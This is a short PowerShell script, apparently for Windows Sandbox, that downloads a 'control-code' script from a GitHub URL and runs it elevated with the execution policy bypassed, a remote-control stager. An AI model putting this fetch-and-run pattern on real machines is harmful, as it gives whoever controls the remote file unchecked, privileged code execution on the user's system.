# Define the GitHub URL for the code file
$codeSource = "https://raw.githubusercontent.com/desimetr/ct/main/control-code.ps1"

# Define the directory and local path to save the downloaded code
$downloadDir = "C:\Users\WDAGUtilityAccount\Downloads"
$localCodePath = "$downloadDir\control-code.ps1"

# Check if the directory exists, if not, create it
if (-Not (Test-Path -Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir
}

# Download the script from GitHub
Invoke-WebRequest -Uri $codeSource -OutFile $localCodePath

# Execute the downloaded script (which could take a screenshot, restart, etc.)
Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $localCodePath" -Verb RunAs

# Wait for a certain period (e.g., 5 minutes) before checking for updates again
Start-Sleep -Seconds 300
